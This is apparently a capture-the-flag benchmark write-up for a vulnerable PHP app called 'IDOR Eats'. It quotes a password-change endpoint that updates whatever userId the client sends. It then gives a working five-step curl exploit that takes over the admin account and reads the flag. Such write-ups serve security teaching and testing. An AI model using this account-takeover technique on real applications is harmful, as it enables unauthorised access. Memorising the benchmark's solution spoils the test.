# XBEN-069-24 — IDOR Eats

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Insecure Direct Object Reference (IDOR) in password-change endpoint
-> account takeover -> privilege escalation.

## Summary

`app/website/api/change_password.php` authenticates the request by checking the
**current session user's** old password, but then applies the UPDATE using a
**client-supplied `userId`** instead of `$_SESSION['user_id']`:

```php
if ($user && password_verify($oldPassword, $user['password'])) {
    $stmt = $db->prepare('UPDATE users SET password = :password WHERE id = :id');
    if ($stmt->execute(['password' => $hashedNewPassword, 'id' => $_POST['userId']])) {
```

`$user` (and therefore the old-password check) is looked up by `$_SESSION['user_id']` (the
logged-in attacker), but the actual row updated is chosen by `$_POST['userId']` — any
authenticated, unprivileged user can supply their *own* correct old password yet target
*any other* user's id, overwriting that account's password. `app/website/profile.php` only
reveals the flag when `$user['role'] === 'ADMIN'` (the `admin` user, id 7 per `app/init.sql`),
so the IDOR is used to take over the admin account.

## Exploit

```bash
PORT=63307
COOKIES=/tmp/idoreats_cookies.txt

# 1. Register a normal, unprivileged account
curl -s -c "$COOKIES" -X POST "http://localhost:$PORT/api/register.php" \
  -d "username=attacker1&email=attacker1@x.local&password=Passw0rd!"

# 2. Log in as that account
curl -s -c "$COOKIES" -b "$COOKIES" -X POST "http://localhost:$PORT/api/login.php" \
  -d "username=attacker1&password=Passw0rd!"

# 3. IDOR: authenticate with OUR OWN old password, but target admin's userId (7)
curl -s -b "$COOKIES" -X POST "http://localhost:$PORT/api/change_password.php" \
  -d "oldPassword=Passw0rd!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=7"

# 4. Log in as admin with the password we just set
curl -s -c /tmp/idoreats_admin_cookies.txt -X POST "http://localhost:$PORT/api/login.php" \
  -d "username=admin&password=Hacked123!"

# 5. Read the flag from the admin profile page
curl -s -b /tmp/idoreats_admin_cookies.txt "http://localhost:$PORT/profile.php" | grep -A1 "ctf-flag"
```
